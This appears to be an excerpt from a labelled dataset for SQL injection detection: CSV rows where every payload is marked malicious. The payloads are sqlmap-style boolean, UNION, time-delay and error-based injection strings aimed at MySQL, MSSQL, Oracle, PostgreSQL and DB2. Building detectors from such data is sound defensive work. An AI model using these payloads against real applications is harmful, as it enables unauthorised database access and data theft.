row_index,payload_norm,label,sqli_type_hint
7410,1'+ ( select 'stdl' where 4581 = 4581,1,
7411,1%' ) ) and 2006 = 2006,1,
7412,"1%"" ) union all select null,null,null,null,null,null,null,null--",1,
7413,1 ) ) as dqfl where 7527 = 7527,1,
7414,"1' in boolean mode ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
7415,"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
7416,select case when 7717 = 7717 then 1 else null end--,1,
7417,"1%"" ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ""%"" = """,1,
7418,"( select * from generate_series ( 3906,3906,case when ( 3906 = 3906 ) then 1 else 0 end ) limit 1 )",1,
7419,"1 ) as vzyk where 5103 = 5103 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
7420,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'vvkl' = 'vvkl",1,
7421,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'wzrj' = 'wzrj",1,
7422,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'cogk' = 'cogk",1,
7423,"-1692' ) union all select 7074,7074,7074,7074,7074,7074,7074#",1,
7424,1'|| ( select 'nvvm' from dual where 5567 = 5567 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',1,
7425,"1"" ) as sraw where 1997 = 1997 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
7426,"1"" ) where 9248 = 9248",1,
7427,"1"" ) where 9855 = 9855",1,
7428,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- xlfz",1,
7429,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""tbcc"" = ""tbcc",1,
7430,-7345 ) union all select 3866#,1,
7431,"1 ) ) ) union all select null,null,null,null,null,null,null,null#",1,
7432,"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""%"" = """,1,
7433,1' rlike sleep ( 5 ) #,1,
7434,"1 ) ) as hrks where 7637 = 7637 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
7435,1' where 8469 = 8469,1,
7436,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'ngwt' = 'ngwt",1,
7437,"1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
7438,"1"" where 6785 = 6785 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
7439,"1%' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",1,
